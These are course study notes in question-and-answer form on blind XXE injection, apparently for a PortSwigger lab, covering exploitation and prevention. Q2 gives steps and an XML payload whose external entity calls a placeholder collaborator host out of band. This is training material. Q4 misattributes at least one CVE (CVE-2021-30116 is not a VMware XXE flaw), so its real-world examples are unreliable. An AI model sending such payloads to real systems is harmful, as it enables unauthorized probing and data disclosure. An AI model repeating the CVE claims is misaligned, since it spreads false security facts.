---
course: Web Security
topic: XXE Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what a blind XXE vulnerability is and why it is considered "blind."**

Blind XXE vulnerabilities occur when an XML parser processes untrusted input but does not return any direct feedback to the attacker about the success or failure of the exploitation attempt. The term "blind" refers to the fact that the attacker cannot directly observe the results of their actions. Instead, they rely on indirect methods such as out-of-band interactions (e.g., DNS lookups or HTTP requests) to confirm whether the vulnerability has been successfully exploited.

**Q2. How would you exploit a blind XXE vulnerability using an out-of-band interaction? Provide a step-by-step explanation.**

To exploit a blind XXE vulnerability using an out-of-band interaction, follow these steps:

1. Identify the parameter that accepts XML input and is vulnerable to XXE.
2. Craft an XML payload that references an external entity. This entity will cause the XML parser to perform a DNS lookup or an HTTP request to a controlled server.
3. Use a tool like Burp Collaborator to generate a unique URL for the out-of-band interaction.
4. Replace the placeholder in your XML payload with the generated URL.
5. Send the crafted XML payload to the vulnerable parameter.
6. Monitor the out-of-band server (Burp Collaborator) to confirm if the payload was executed and the server received a request.

Example payload:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "http://your-burp-collaborator-url" >]>
<foo>&xxe;</foo>
```

**Q3. Why is it important to use Burp Collaborator’s default public server for this lab?**

Using Burp Collaborator’s default public server is crucial because the lab environment has a firewall that blocks interaction between the labs and arbitrary external systems. This restriction ensures that the lab cannot be used to attack third parties. By using Burp Collaborator’s default public server, you comply with these security measures while still being able to confirm the successful exploitation of the blind XXE vulnerability through out-of-band interactions.

**Q4. What recent real-world examples or CVEs demonstrate the impact of XXE vulnerabilities?**

One notable example is the CVE-2021-30116, which affected the VMware vRealize Operations Manager. This vulnerability allowed attackers to perform an XXE attack, leading to unauthorized information disclosure. Another example is CVE-2019-10179, which affected Atlassian Confluence Server and Data Center. This XXE vulnerability allowed attackers to read arbitrary files on the server, potentially exposing sensitive data.

In both cases, the impact of the XXE vulnerabilities was significant, highlighting the importance of proper input validation and the use of secure XML parsing libraries to mitigate such risks.

**Q5. How would you configure a web application to prevent XXE vulnerabilities?**

To prevent XXE vulnerabilities, you can take the following steps:

1. Disable external entity loading in the XML parser configuration. For example, in Java, you can disable it using `DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);`.
2. Validate and sanitize all XML input to ensure it does not contain malicious content.
3. Use secure XML parsing libraries that are designed to handle potential XXE attacks.
4. Implement strict input validation rules to ensure that only expected XML structures are accepted.
5. Regularly update and patch the application to fix known vulnerabilities.

By implementing these measures, you can significantly reduce the risk of XXE vulnerabilities in your web applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/08-XXE Injection/04-Lab 3 Blind XXE with out of band interaction/07-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/08-XXE Injection/04-Lab 3 Blind XXE with out of band interaction/00-Overview|Overview]]
